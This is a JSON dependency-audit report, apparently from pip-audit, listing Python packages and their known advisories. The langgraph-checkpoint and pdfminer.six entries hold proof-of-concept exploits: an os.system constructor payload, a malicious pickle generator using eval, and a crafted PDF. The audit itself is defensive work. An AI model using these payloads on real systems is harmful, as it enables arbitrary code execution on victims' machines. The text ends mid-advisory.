{"dependencies": [{"name": "accelerate", "version": "1.11.0", "vulns": []}, {"name": "advancedanalytics", "version": "1.39", "vulns": []}, {"name": "aiofiles", "version": "25.1.0", "vulns": []}, {"name": "aiohappyeyeballs", "version": "2.6.1", "vulns": []}, {"name": "aiohttp", "version": "3.12.15", "vulns": []}, {"name": "aiosignal", "version": "1.4.0", "vulns": []}, {"name": "aiosqlite", "version": "0.21.0", "vulns": []}, {"name": "alembic", "version": "1.16.5", "vulns": []}, {"name": "altair", "version": "5.5.0", "vulns": []}, {"name": "amqp", "version": "5.3.1", "vulns": []}, {"name": "annotated-types", "version": "0.7.0", "vulns": []}, {"name": "anthropic", "version": "0.69.0", "vulns": []}, {"name": "antlr4-python3-runtime", "version": "4.9.3", "vulns": []}, {"name": "anyio", "version": "4.11.0", "vulns": []}, {"name": "appdirs", "version": "1.4.4", "vulns": []}, {"name": "appnope", "version": "0.1.4", "vulns": []}, {"name": "apscheduler", "version": "3.11.0", "vulns": []}, {"name": "archspec", "version": "0.2.5", "vulns": []}, {"name": "argon2-cffi", "version": "25.1.0", "vulns": []}, {"name": "argon2-cffi-bindings", "version": "25.1.0", "vulns": []}, {"name": "arrow", "version": "1.4.0", "vulns": []}, {"name": "asgiref", "version": "3.10.0", "vulns": []}, {"name": "astroid", "version": "4.0.2", "vulns": []}, {"name": "asttokens", "version": "3.0.0", "vulns": []}, {"name": "async-lru", "version": "2.0.5", "vulns": []}, {"name": "async-timeout", "version": "5.0.1", "vulns": []}, {"name": "asyncpg", "version": "0.30.0", "vulns": []}, {"name": "attrs", "version": "25.4.0", "vulns": []}, {"name": "authlib", "version": "1.6.5", "vulns": []}, {"name": "aws-requests-auth", "version": "0.4.3", "vulns": []}, {"name": "babel", "version": "2.17.0", "vulns": []}, {"name": "backoff", "version": "2.2.1", "vulns": []}, {"name": "bandit", "version": "1.8.6", "vulns": []}, {"name": "bcrypt", "version": "5.0.0", "vulns": []}, {"name": "beautifulsoup4", "version": "4.14.2", "vulns": []}, {"name": "bidict", "version": "0.23.1", "vulns": []}, {"name": "billiard", "version": "4.2.2", "vulns": []}, {"name": "black", "version": "25.9.0", "vulns": []}, {"name": "bleach", "version": "6.3.0", "vulns": []}, {"name": "blinker", "version": "1.9.0", "vulns": []}, {"name": "blis", "version": "1.3.0", "vulns": []}, {"name": "boltons", "version": "25.0.0", "vulns": []}, {"name": "boolean-py", "version": "5.0", "vulns": []}, {"name": "boto3", "version": "1.40.69", "vulns": []}, {"name": "boto3-stubs", "version": "1.40.69", "vulns": []}, {"name": "botocore", "version": "1.40.69", "vulns": []}, {"name": "botocore-stubs", "version": "1.40.69", "vulns": []}, {"name": "bracex", "version": "2.5", "vulns": []}, {"name": "brotli", "version": "1.1.0", "vulns": [{"id": "GHSA-2qfp-q593-8484", "fix_versions": ["1.2.0"], "aliases": ["CVE-2025-6176"], "description": "Brotli versions up to 1.1.0 are vulnerable to a denial of service (DoS) attack due to decompression. This issue has been patched in Brotli version 1.2.0.   Additionally, this affects users who implement the Brotli decompression with Scrapy versions up to 2.13.2, leaving them vulnerable to a denial of service (DoS) attack. The protection mechanism against decompression bombs fails to mitigate the brotli variant, allowing remote servers to crash clients with less than 80GB of available memory. This occurs because brotli can achieve extremely high compression ratios for zero-filled data, leading to excessive memory consumption during decompression."}]}, {"name": "build", "version": "1.3.0", "vulns": []}, {"name": "cachecontrol", "version": "0.14.3", "vulns": []}, {"name": "cached-property", "version": "1.5.2", "vulns": []}, {"name": "cachetools", "version": "6.2.0", "vulns": []}, {"name": "camelot-py", "version": "1.0.9", "vulns": []}, {"name": "career-copilot", "skip_reason": "Dependency not found on PyPI and could not be audited: career-copilot (1.0.0)"}, {"name": "cargo", "version": "0.3", "vulns": []}, {"name": "catalogue", "version": "2.0.10", "vulns": []}, {"name": "celery", "version": "5.5.3", "vulns": []}, {"name": "certifi", "version": "2025.10.5", "vulns": []}, {"name": "cffi", "version": "2.0.0", "vulns": []}, {"name": "cfgv", "version": "3.4.0", "vulns": []}, {"name": "chardet", "version": "5.2.0", "vulns": []}, {"name": "charset-normalizer", "version": "3.4.4", "vulns": []}, {"name": "chromadb", "version": "1.1.1", "vulns": []}, {"name": "cleo", "version": "2.1.0", "vulns": []}, {"name": "click", "version": "8.3.0", "vulns": []}, {"name": "click-didyoumean", "version": "0.3.1", "vulns": []}, {"name": "click-option-group", "version": "0.5.9", "vulns": []}, {"name": "click-plugins", "version": "1.1.1.2", "vulns": []}, {"name": "click-repl", "version": "0.3.0", "vulns": []}, {"name": "cloudpathlib", "version": "0.23.0", "vulns": []}, {"name": "colorama", "version": "0.4.6", "vulns": []}, {"name": "coloredlogs", "version": "15.0.1", "vulns": []}, {"name": "colorlog", "version": "6.10.1", "vulns": []}, {"name": "comm", "version": "0.2.3", "vulns": []}, {"name": "commonmark", "version": "0.9.1", "vulns": []}, {"name": "conda", "skip_reason": "Dependency not found on PyPI and could not be audited: conda (25.9.0)"}, {"name": "conda-package-handling", "version": "2.4.0", "vulns": []}, {"name": "conda-package-streaming", "version": "0.12.0", "vulns": []}, {"name": "confection", "version": "0.1.5", "vulns": []}, {"name": "configargparse", "version": "1.7.1", "vulns": []}, {"name": "contourpy", "version": "1.3.3", "vulns": []}, {"name": "coverage", "version": "7.10.7", "vulns": []}, {"name": "crashtest", "version": "0.4.1", "vulns": []}, {"name": "crewai", "version": "0.201.1", "vulns": []}, {"name": "cryptography", "version": "46.0.2", "vulns": []}, {"name": "cycler", "version": "0.12.1", "vulns": []}, {"name": "cyclonedx-python-lib", "version": "9.1.0", "vulns": []}, {"name": "cymem", "version": "2.0.11", "vulns": []}, {"name": "dataclasses-json", "version": "0.6.7", "vulns": []}, {"name": "debugpy", "version": "1.8.17", "vulns": []}, {"name": "decorator", "version": "5.2.1", "vulns": []}, {"name": "defusedxml", "version": "0.7.1", "vulns": []}, {"name": "deprecated", "version": "1.3.1", "vulns": []}, {"name": "dill", "version": "0.4.0", "vulns": []}, {"name": "diskcache", "version": "5.6.3", "vulns": []}, {"name": "distlib", "version": "0.4.0", "vulns": []}, {"name": "distro", "version": "1.9.0", "vulns": []}, {"name": "dnspython", "version": "2.8.0", "vulns": []}, {"name": "docling", "version": "2.61.0", "vulns": []}, {"name": "docling-core", "version": "2.50.1", "vulns": []}, {"name": "docling-ibm-models", "version": "3.10.2", "vulns": []}, {"name": "docling-parse", "version": "4.7.1", "vulns": []}, {"name": "docstring-parser", "version": "0.17.0", "vulns": []}, {"name": "docutils", "version": "0.22.2", "vulns": []}, {"name": "docx2txt", "version": "0.9", "vulns": []}, {"name": "dotenv", "version": "0.9.9", "vulns": []}, {"name": "dparse", "version": "0.6.4", "vulns": []}, {"name": "duckdb", "version": "1.4.0", "vulns": []}, {"name": "dulwich", "version": "0.24.8", "vulns": []}, {"name": "durationpy", "version": "0.10", "vulns": []}, {"name": "ecdsa", "version": "0.19.1", "vulns": [{"id": "GHSA-wj6h-64fc-37mp", "fix_versions": [], "aliases": ["CVE-2024-23342"], "description": "python-ecdsa has been found to be subject to a Minerva timing attack on the P-256 curve. Using the `ecdsa.SigningKey.sign_digest()` API function and timing signatures an attacker can leak the internal nonce which may allow for private key discovery. Both ECDSA signatures, key generation, and ECDH operations are affected. ECDSA signature verification is unaffected. The python-ecdsa project considers side channel attacks out of scope for the project and there is no planned fix."}]}, {"name": "email-validator", "version": "2.3.0", "vulns": []}, {"name": "en-core-web-sm", "skip_reason": "Dependency not found on PyPI and could not be audited: en-core-web-sm (3.8.0)"}, {"name": "et-xmlfile", "version": "2.0.0", "vulns": []}, {"name": "exceptiongroup", "version": "1.3.0", "vulns": []}, {"name": "executing", "version": "2.2.1", "vulns": []}, {"name": "face", "version": "22.0.0", "vulns": []}, {"name": "fake-useragent", "version": "2.2.0", "vulns": []}, {"name": "faker", "version": "37.12.0", "vulns": []}, {"name": "fastapi", "version": "0.118.0", "vulns": []}, {"name": "fastjsonschema", "version": "2.21.2", "vulns": []}, {"name": "feedparser", "version": "6.0.12", "vulns": []}, {"name": "filelock", "version": "3.20.0", "vulns": []}, {"name": "filetype", "version": "1.2.0", "vulns": []}, {"name": "findpython", "version": "0.7.0", "vulns": []}, {"name": "fire", "version": "0.7.1", "vulns": []}, {"name": "firebase-admin", "version": "7.1.0", "vulns": []}, {"name": "flask", "version": "3.1.2", "vulns": []}, {"name": "flask-cors", "version": "6.0.1", "vulns": []}, {"name": "flask-login", "version": "0.6.3", "vulns": []}, {"name": "flatbuffers", "version": "25.9.23", "vulns": []}, {"name": "fonttools", "version": "4.60.1", "vulns": []}, {"name": "fqdn", "version": "1.5.1", "vulns": []}, {"name": "freezegun", "version": "1.5.5", "vulns": []}, {"name": "frozendict", "version": "2.4.6", "vulns": []}, {"name": "frozenlist", "version": "1.7.0", "vulns": []}, {"name": "fsspec", "version": "2025.10.0", "vulns": []}, {"name": "gemini-bridge", "version": "1.1.1", "vulns": []}, {"name": "gevent", "version": "25.9.1", "vulns": []}, {"name": "geventhttpclient", "version": "2.3.4", "vulns": []}, {"name": "gitdb", "version": "4.0.12", "vulns": []}, {"name": "gitpython", "version": "3.1.45", "vulns": []}, {"name": "glom", "version": "22.1.0", "vulns": []}, {"name": "google-api-core", "version": "2.26.0", "vulns": []}, {"name": "google-api-python-client", "version": "2.185.0", "vulns": []}, {"name": "google-auth", "version": "2.41.1", "vulns": []}, {"name": "google-auth-httplib2", "version": "0.2.0", "vulns": []}, {"name": "google-auth-oauthlib", "version": "1.2.2", "vulns": []}, {"name": "google-cloud-appengine-logging", "version": "1.7.0", "vulns": []}, {"name": "google-cloud-audit-log", "version": "0.4.0", "vulns": []}, {"name": "google-cloud-core", "version": "2.4.3", "vulns": []}, {"name": "google-cloud-firestore", "version": "2.21.0", "vulns": []}, {"name": "google-cloud-logging", "version": "3.12.1", "vulns": []}, {"name": "google-cloud-storage", "version": "3.4.1", "vulns": []}, {"name": "google-crc32c", "version": "1.7.1", "vulns": []}, {"name": "google-resumable-media", "version": "2.7.2", "vulns": []}, {"name": "googleapis-common-protos", "version": "1.70.0", "vulns": []}, {"name": "greenlet", "version": "3.2.4", "vulns": []}, {"name": "groq", "version": "0.32.0", "vulns": []}, {"name": "grpc-google-iam-v1", "version": "0.14.3", "vulns": []}, {"name": "grpcio", "version": "1.75.1", "vulns": []}, {"name": "grpcio-status", "version": "1.75.1", "vulns": []}, {"name": "gunicorn", "version": "23.0.0", "vulns": []}, {"name": "h11", "version": "0.16.0", "vulns": []}, {"name": "h2", "version": "4.2.0", "vulns": [{"id": "GHSA-847f-9342-265h", "fix_versions": ["4.3.0"], "aliases": ["CVE-2025-57804"], "description": "### Summary  HTTP/2 request splitting vulnerability allows attackers to perform request smuggling attacks by injecting CRLF characters into headers. This occurs when servers downgrade HTTP/2 requests to HTTP/1.1 without properly validating header names/values, enabling attackers to manipulate request boundaries and bypass security controls."}]}, {"name": "hf-xet", "version": "1.2.0", "vulns": []}, {"name": "hpack", "version": "4.1.0", "vulns": []}, {"name": "httpcore", "version": "1.0.9", "vulns": []}, {"name": "httplib2", "version": "0.31.0", "vulns": []}, {"name": "httptools", "version": "0.6.4", "vulns": []}, {"name": "httpx", "version": "0.28.1", "vulns": []}, {"name": "httpx-sse", "version": "0.4.3", "vulns": []}, {"name": "huggingface-hub", "version": "0.36.0", "vulns": []}, {"name": "humanfriendly", "version": "10.0", "vulns": []}, {"name": "hyperframe", "version": "6.1.0", "vulns": []}, {"name": "identify", "version": "2.6.15", "vulns": []}, {"name": "idna", "version": "3.11", "vulns": []}, {"name": "imageio", "version": "2.37.0", "vulns": []}, {"name": "importlib-metadata", "version": "8.7.0", "vulns": []}, {"name": "importlib-resources", "version": "6.5.2", "vulns": []}, {"name": "iniconfig", "version": "2.1.0", "vulns": []}, {"name": "install-playwright", "version": "0.1.1", "vulns": []}, {"name": "installer", "version": "0.7.0", "vulns": []}, {"name": "instructor", "version": "1.11.3", "vulns": []}, {"name": "ipykernel", "version": "6.30.1", "vulns": []}, {"name": "ipython", "version": "9.6.0", "vulns": []}, {"name": "ipython-pygments-lexers", "version": "1.1.1", "vulns": []}, {"name": "ipywidgets", "version": "8.1.8", "vulns": []}, {"name": "isoduration", "version": "20.11.0", "vulns": []}, {"name": "isort", "version": "7.0.0", "vulns": []}, {"name": "itsdangerous", "version": "2.2.0", "vulns": []}, {"name": "jaraco-classes", "version": "3.4.0", "vulns": []}, {"name": "jaraco-context", "version": "6.0.1", "vulns": []}, {"name": "jaraco-functools", "version": "4.3.0", "vulns": []}, {"name": "jedi", "version": "0.19.2", "vulns": []}, {"name": "jinja2", "version": "3.1.6", "vulns": []}, {"name": "jiter", "version": "0.10.0", "vulns": []}, {"name": "jmespath", "version": "1.0.1", "vulns": []}, {"name": "joblib", "version": "1.5.2", "vulns": []}, {"name": "json-repair", "version": "0.25.2", "vulns": []}, {"name": "json5", "version": "0.12.1", "vulns": []}, {"name": "jsonlines", "version": "4.0.0", "vulns": []}, {"name": "jsonpatch", "version": "1.33", "vulns": []}, {"name": "jsonpickle", "version": "4.1.1", "vulns": []}, {"name": "jsonpointer", "version": "3.0.0", "vulns": []}, {"name": "jsonref", "version": "1.1.0", "vulns": []}, {"name": "jsonschema", "version": "4.25.1", "vulns": []}, {"name": "jsonschema-specifications", "version": "2025.9.1", "vulns": []}, {"name": "jupyter", "version": "1.1.1", "vulns": []}, {"name": "jupyter-client", "version": "8.6.3", "vulns": []}, {"name": "jupyter-console", "version": "6.6.3", "vulns": []}, {"name": "jupyter-core", "version": "5.8.1", "vulns": []}, {"name": "jupyter-events", "version": "0.12.0", "vulns": []}, {"name": "jupyter-lsp", "version": "2.3.0", "vulns": []}, {"name": "jupyter-server", "version": "2.17.0", "vulns": []}, {"name": "jupyter-server-terminals", "version": "0.5.3", "vulns": []}, {"name": "jupyterlab", "version": "4.4.10", "vulns": []}, {"name": "jupyterlab-pygments", "version": "0.3.0", "vulns": []}, {"name": "jupyterlab-server", "version": "2.28.0", "vulns": []}, {"name": "jupyterlab-widgets", "version": "3.0.16", "vulns": []}, {"name": "keyring", "version": "25.6.0", "vulns": []}, {"name": "kiwisolver", "version": "1.4.9", "vulns": []}, {"name": "kombu", "version": "5.5.4", "vulns": []}, {"name": "kubernetes", "version": "34.1.0", "vulns": []}, {"name": "langchain", "version": "0.3.27", "vulns": []}, {"name": "langchain-anthropic", "version": "0.3.21", "vulns": []}, {"name": "langchain-classic", "version": "1.0.0", "vulns": []}, {"name": "langchain-community", "version": "0.4.1", "vulns": []}, {"name": "langchain-core", "version": "1.0.4", "vulns": []}, {"name": "langchain-mcp-adapters", "version": "0.1.12", "vulns": []}, {"name": "langchain-openai", "version": "0.3.34", "vulns": []}, {"name": "langchain-text-splitters", "version": "1.0.0", "vulns": []}, {"name": "langcodes", "version": "3.5.0", "vulns": []}, {"name": "langgraph", "version": "0.6.8", "vulns": []}, {"name": "langgraph-checkpoint", "version": "2.1.1", "vulns": [{"id": "GHSA-wwqv-p2pp-99h5", "fix_versions": ["3.0.0"], "aliases": ["CVE-2025-64439"], "description": "# Summary  Prior to `langgraph-checkpoint` version `3.0` , LangGraph\u2019s `JsonPlusSerializer` (used as the default serialization protocol for all checkpointing) contains a remote code execution (RCE) vulnerability when deserializing payloads saved in the `\"json\"` serialization mode.  If an attacker can cause your application to persist a payload serialized in this mode, they may be able to also send malicious content that executes arbitrary Python code during deserialization.  Upgrading to version langgraph-checkpoint `3.0` patches this vulnerability by preventing deserialization of custom objects saved in this mode.  If you are deploying in `langgraph-api`, any version `0.5` or later is also free of this vulnerability.   # Details  **Affected file / component**  [jsonplus.py](https://github.com/langchain-ai/langgraph/blob/c5744f583b11745cd406f3059903e17bbcdcc8ac/libs/checkpoint/langgraph/checkpoint/serde/jsonplus.py)  By default, the serializer attempts to use `\"msgpack\"` for serialization. However, prior to version `3.0` of the checkpointer library, if illegal Unicode surrogate values caused serialization to fail,  it would fall back to using the `\"json\"` mode.  When operating in this mode, the deserializer supports a constructor-style format (`lc == 2`, `type == \"constructor\"`) for custom objects to allow them to be reconstructed at load time.  If an attacker is able to trigger this mode with a malicious payload, deserializing  allow the attacker to execute arbitrary functions upon load.  ---  # Who is affected  This issue affects all users of `langgraph-checkpoint` **versions earlier than 3.0** who:  1. Allow untrusted or user-supplied data to be persisted into checkpoints, and 2. Use the default serializer (or explicitly instantiate `JsonPlusSerializer`) that may fall back to `\"json\"` mode.  If your application only processes trusted data or does not allow untrusted checkpoint writes, the practical risk is reduced.  # Proof of Concept (PoC)  ```python from langgraph.graph import StateGraph  from typing import TypedDict from langgraph.checkpoint.sqlite import SqliteSaver  class State(TypedDict):     foo: str     attack: dict  def my_node(state: State):     return {\"foo\": \"oops i fetched a surrogate \\ud800\"}  with SqliteSaver.from_conn_string(\"foo.db\") as saver:     graph = ( \t    StateGraph(State). \t    add_node(\"my_node\", my_node). \t    add_edge(\"__start__\", \"my_node\"). \t    compile(checkpointer=saver) \t )           attack = {         \"lc\": 2,         \"type\": \"constructor\",         \"id\": [\"os\", \"system\"],         \"kwargs\": {\"command\": \"echo pwnd you > /tmp/pwnd.txt\"},     }     malicious_payload = {          \"attack\": attack,     }      thread_id = \"00000000-0000-0000-0000-000000000001\"     config = {\"thread_id\": thread_id}     # Malicious payload is saved in the first call     graph.invoke(malicious_payload, config=config)      # Malicious payload is deserialized and code is executed in the second call     graph.invoke({\"foo\": \"hi there\"}, config=config)  ```  Running this PoC writes a file `/tmp/pwnd.txt` to disk, demonstrating code execution.  Internally, this exploits the following code path:  ```python from langgraph.checkpoint.serde.jsonplus import JsonPlusSerializer  serializer = JsonPlusSerializer() # Used within the checkpointer  serialized = serializer.dumps_typed(malicious_payload) serializer.loads_typed(serialized)  # Executes os.system(...)  ```  ---  # Fixed Version  The vulnerability is fixed in **`langgraph-checkpoint==3.0.0`**  Release link: https://github.com/langchain-ai/langgraph/releases/tag/checkpoint%3D%3D3.0.0  ---  # Fix Description  The fix introduces an **allow-list** for constructor deserialization, restricting permissible `\"id\"` paths to explicitly approved module/class combinations provided at serializer construction.  Additionally, saving payloads in `\"json\"` format has been deprecated to remove this unsafe fallback path.  ---  # Mitigation  Upgrade immediately to `langgraph-checkpoint==3.0.0`.  This version is fully compatible with `langgraph>=0.3` and does **not** require any import changes or code modifications.  In `langgraph-api`, updating to `0.5` or later will automatically require the patched version of the checkpointer library."}]}, {"name": "langgraph-prebuilt", "version": "0.6.4", "vulns": []}, {"name": "langgraph-sdk", "version": "0.2.9", "vulns": []}, {"name": "langsmith", "version": "0.4.32", "vulns": []}, {"name": "language-data", "version": "1.3.0", "vulns": []}, {"name": "lark", "version": "1.3.1", "vulns": []}, {"name": "latex2mathml", "version": "3.78.1", "vulns": []}, {"name": "lazy-loader", "version": "0.4", "vulns": []}, {"name": "libmambapy", "skip_reason": "Dependency not found on PyPI and could not be audited: libmambapy (2.1.1)"}, {"name": "license-expression", "version": "30.4.4", "vulns": []}, {"name": "litellm", "version": "1.74.9", "vulns": []}, {"name": "locust", "version": "2.42.0", "vulns": []}, {"name": "locust-cloud", "version": "1.27.6", "vulns": []}, {"name": "loro", "version": "1.8.1", "vulns": []}, {"name": "lxml", "version": "6.0.2", "vulns": []}, {"name": "mako", "version": "1.3.10", "vulns": []}, {"name": "marimo", "version": "0.17.0", "vulns": []}, {"name": "marisa-trie", "version": "1.3.1", "vulns": []}, {"name": "markdown", "version": "3.9", "vulns": []}, {"name": "markdown-it-py", "version": "4.0.0", "vulns": []}, {"name": "markdownify", "version": "1.2.0", "vulns": []}, {"name": "marko", "version": "2.2.1", "vulns": []}, {"name": "markupsafe", "version": "3.0.3", "vulns": []}, {"name": "marshmallow", "version": "3.26.1", "vulns": []}, {"name": "matplotlib", "version": "3.10.6", "vulns": []}, {"name": "matplotlib-inline", "version": "0.1.7", "vulns": []}, {"name": "mccabe", "version": "0.7.0", "vulns": []}, {"name": "mcp", "version": "1.21.0", "vulns": []}, {"name": "mdurl", "version": "0.1.2", "vulns": []}, {"name": "menuinst", "skip_reason": "Dependency not found on PyPI and could not be audited: menuinst (2.3.1)"}, {"name": "mistune", "version": "3.1.4", "vulns": []}, {"name": "mmh3", "version": "5.2.0", "vulns": []}, {"name": "more-itertools", "version": "10.8.0", "vulns": []}, {"name": "mpire", "version": "2.10.2", "vulns": []}, {"name": "mpmath", "version": "1.3.0", "vulns": []}, {"name": "msgpack", "version": "1.1.2", "vulns": []}, {"name": "msgspec", "version": "0.19.0", "vulns": []}, {"name": "msgspec-m", "version": "0.19.2", "vulns": []}, {"name": "multidict", "version": "6.6.4", "vulns": []}, {"name": "multiprocess", "version": "0.70.18", "vulns": []}, {"name": "murmurhash", "version": "1.0.13", "vulns": []}, {"name": "mypy", "version": "1.18.2", "vulns": []}, {"name": "mypy-boto3-s3", "version": "1.40.61", "vulns": []}, {"name": "mypy-extensions", "version": "1.1.0", "vulns": []}, {"name": "narwhals", "version": "2.6.0", "vulns": []}, {"name": "nbclient", "version": "0.10.2", "vulns": []}, {"name": "nbconvert", "version": "7.16.6", "vulns": []}, {"name": "nbformat", "version": "5.10.4", "vulns": []}, {"name": "nest-asyncio", "version": "1.6.0", "vulns": []}, {"name": "networkx", "version": "3.5", "vulns": []}, {"name": "nltk", "version": "3.9.2", "vulns": []}, {"name": "nodeenv", "version": "1.9.1", "vulns": []}, {"name": "notebook", "version": "7.4.7", "vulns": []}, {"name": "notebook-shim", "version": "0.2.4", "vulns": []}, {"name": "nova-act", "version": "2.1.319.0", "vulns": []}, {"name": "numpy", "version": "2.2.6", "vulns": []}, {"name": "oauthlib", "version": "3.3.1", "vulns": []}, {"name": "ocrmac", "version": "1.0.0", "vulns": []}, {"name": "omegaconf", "version": "2.3.0", "vulns": []}, {"name": "onnxruntime", "version": "1.23.0", "vulns": []}, {"name": "openai", "version": "1.109.1", "vulns": []}, {"name": "opencv-python", "version": "4.12.0.88", "vulns": []}, {"name": "opencv-python-headless", "version": "4.12.0.88", "vulns": []}, {"name": "openpyxl", "version": "3.1.5", "vulns": []}, {"name": "opentelemetry-api", "version": "1.38.0", "vulns": []}, {"name": "opentelemetry-exporter-otlp-proto-common", "version": "1.37.0", "vulns": []}, {"name": "opentelemetry-exporter-otlp-proto-grpc", "version": "1.37.0", "vulns": []}, {"name": "opentelemetry-exporter-otlp-proto-http", "version": "1.37.0", "vulns": []}, {"name": "opentelemetry-instrumentation", "version": "0.59b0", "vulns": []}, {"name": "opentelemetry-instrumentation-asgi", "version": "0.58b0", "vulns": []}, {"name": "opentelemetry-instrumentation-fastapi", "version": "0.58b0", "vulns": []}, {"name": "opentelemetry-instrumentation-requests", "version": "0.59b0", "vulns": []}, {"name": "opentelemetry-instrumentation-threading", "version": "0.59b0", "vulns": []}, {"name": "opentelemetry-proto", "version": "1.37.0", "vulns": []}, {"name": "opentelemetry-sdk", "version": "1.38.0", "vulns": []}, {"name": "opentelemetry-semantic-conventions", "version": "0.59b0", "vulns": []}, {"name": "opentelemetry-util-http", "version": "0.59b0", "vulns": []}, {"name": "orjson", "version": "3.11.3", "vulns": []}, {"name": "ormsgpack", "version": "1.10.0", "vulns": []}, {"name": "overrides", "version": "7.7.0", "vulns": []}, {"name": "packageurl-python", "version": "0.17.5", "vulns": []}, {"name": "packaging", "version": "25.0", "vulns": []}, {"name": "pandas", "version": "2.3.3", "vulns": []}, {"name": "pandocfilters", "version": "1.5.0", "vulns": []}, {"name": "parso", "version": "0.8.5", "vulns": []}, {"name": "passlib", "version": "1.7.4", "vulns": []}, {"name": "pathspec", "version": "0.12.1", "vulns": []}, {"name": "patsy", "version": "1.0.1", "vulns": []}, {"name": "pbs-installer", "version": "2025.10.31", "vulns": []}, {"name": "pdf2image", "version": "1.17.0", "vulns": []}, {"name": "pdfminer-six", "version": "20250506", "vulns": [{"id": "GHSA-wf5f-4jwr-ppcp", "fix_versions": ["20251107"], "aliases": ["CVE-2025-64512"], "description": "### Summary  pdfminer.six will execute arbitrary code from a malicious pickle file if provided with a malicious PDF file. The `CMapDB._load_data()` function in pdfminer.six uses `pickle.loads()` to deserialize pickle files. These pickle files are supposed to be part of the pdfminer.six distribution stored in the `cmap/` directory, but a malicious PDF can specify an alternative directory and filename as long as the filename ends in `.pickle.gz`. A malicious, zipped pickle file can then contain code which will automatically execute when the PDF is processed.  ### Details  ```python # Vulnerable code in pdfminer/cmapdb.py:233-246 def _load_data(cls, name: str) -> Any:     name = name.replace(\"\\0\", \"\")  # Insufficient sanitization     filename = \"%s.pickle.gz\" % name     # ... path construction ...     path = os.path.join(directory, filename) # If filename is an absolte path, directory is ignored     # ...     return type(str(name), (), pickle.loads(gzfile.read()))  # Unsafe deserialization ```  An attacker can: 1. Create a malicious PDF with a CMap reference like `/malicious` 2. Place a malicious pickle file at `/malicious.pickle.gz` 3. When the PDF is processed, pdfminer loads and deserializes the malicious pickle 4. The pickle deserialization can execute arbitrary Python code  ### POC  #### Malicious PDF  Create a PDF with a malicious CMAP entry:  ``` 5 0 obj << /Type /Font /Subtype /Type0 /BaseFont /MaliciousFont-Identity-H /Encoding /#2Fpdfs#2Fmalicious /DescendantFonts [6 0 R] >> endobj ```  Here the /Encoding points to `/pdfs/malicious`. Pdfminer will append the extension `.pickle.gz` to this filename. Place the PDF in a file called `/pdfs/malicious.pdf`.  #### Malicious Pickle  Create a malicious, zipped pickle to execute. For example, with this Python script:  ```python #!/usr/bin/env python3 import pickle import gzip  def create_demo_pickle():     print(\"Creating demonstration pickle file...\")      # Create payload that executes code AND returns a dict (as pdfminer expects)     class EvilPayload:         def __reduce__(self):             # This function will be called during unpickling             code = \"print('Malicious code executed.') or exit(0) or {}\"             return (eval, (code,))      demo_cmap_data = EvilPayload()      # Create the pickle file that the path traversal would access     target_path = \"./malicious.pickle.gz\"      try:         with gzip.open(target_path, 'wb') as f:             pickle.dump(demo_cmap_data, f)         print(f\"\u2713 Created demonstration pickle file: {target_path}\")         return target_path      except Exception as e:         print(f\"\u2717 Error creating pickle file: {e}\")         return None  if __name__ == \"__main__\":     create_demo_pickle() ```  This will create a harmless, zipped pickle file that will display \"Malicious code eecuted.\" then exit when deserialized. Put the file in `/pdfs/malicious.pickle.gz`.  #### Test  Install pdfminer.six and run `pdf2text.py /pdfs/malicious.pdf`. Instead of processing the PDF as normal you should see the output:  ``` $ pdf2txt.py malicious.pdf Malicious code executed! ```  ### Impact  If pdfminer.six processes a malicious PDF which points to a zipped pickle file under the control of an attacker the result is arbitrary code execution on the victim's system. An attacker could execute the Python code of their chosing with the permissions of the process running pdfminer.six.  The difficulty in achieving this depends on the OS, see below.  #### Linux, MacOS - harder to exploit  On Linux-like systems only files on the filesystem can be resolved. An attacker would need to provide the malicious PDF for processing *and* the malicious pickle file would need to be present on the target system in a location that the attacker already knows, since it needs to be set in the PDF itself. In many cases this will be difficult to exploit because even if the attacker provides both the PDF and the pickle file together, there would be no way to know in advance which full path to the pickle file to specify. In many cases this would make exploitation difficult or impossible. However:  * An attacker may find a way to write files to a known location on the target system or * The system in question may, by design, read files from a known location such as a network share designated for PDF ingestion.  Overall, there is generally less risk on a Linux or Linux-like system.  #### Windows - easier to exploit  Windows paths can specify network locations e.g. WebDAV, SMB. This means that an attacker could host the malicious pickle remotely and specify a path to the it in the PDF. Since there is no need to get the malicious pickle file on to the target system, exploitation is easier on a Windows OS.  ### Appendix  A complete, malicious PDF is provided here. A dockerized POC is available upon request.  ``` %PDF-1.4 1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj  2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj  3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >> endobj  4 0 obj << /Length 44 >> stream BT /F1 12 Tf 100 700 Td (Malicious PDF) Tj ET endstream endobj  5 0 obj << /Type /Font /Subtype /Type0 /BaseFont /MaliciousFont-Identity-H /Encoding /#2Fpdfs#2Fmalicious /DescendantFonts [6 0 R] >> endobj  6 0 obj << /Type /Font /Subtype /CIDFontType2 /BaseFont /MaliciousFont /CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >> /FontDescriptor 7 0 R >> endobj  7 0 obj << /Type /FontDescriptor /FontName /MaliciousFont /Flags 4 /FontBBox [-1000 -1000 1000 1000] /ItalicAngle 0 /Ascent 1000 /Descent -200 /CapHeight 800 /StemV 80 >> endobj  xref 0 8 0000000000 65535 f 0000000009 00000 n 0000000058 00000 n 0000000115 00000 n 0000000274 00000 n 0000000370 00000 n 0000000503 00000 n 0000000673 00000 n trailer << /Size 8 /Root 1 0 R >> startxref 871 %%EOF ```"}, {"id": "GHSA-f83h-ghpp-7wcc", "fix_versions": [], "aliases": [], "description": "### \ud83d\ude80 Overview  This report **demonstrates a real-world privilege escalation** vulnerability in [pdfminer.six](https://github.com/pdfminer/pdfminer.six) due to unsafe usage of Python's `pickle` module for CMap file loading. It shows how a low-privileged user can gain root access (or escalate to any service account) by exploiting insecure deserialization in a typical multi-user or server environment.  ![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif)  ## \ud83d\udea8 Special Note  This advisory addresses a distinct vulnerability from [GHSA-wf5f-4jwr-ppcp (CVE-2025-64512)](https://github.com/pdfminer/pdfminer.six/security/advisories/GHSA-wf5f-4jwr-ppcp).  While the previous CVE claims to mitigate issues related to unsafe deserialization, the patch introduced in commit [b808ee05dd7f0c8ea8ec34bdf394d40e63501086](https://github.com/pdfminer/pdfminer.six/commit/b808ee05dd7f0c8ea8ec34bdf394d40e63501086) does not address the vulnerability reported here.  Based on testing performed against the latest version of the library ([comparison view](https://github.com/pdfminer/pdfminer.six/compare/20250506...20251107)), the issue remains 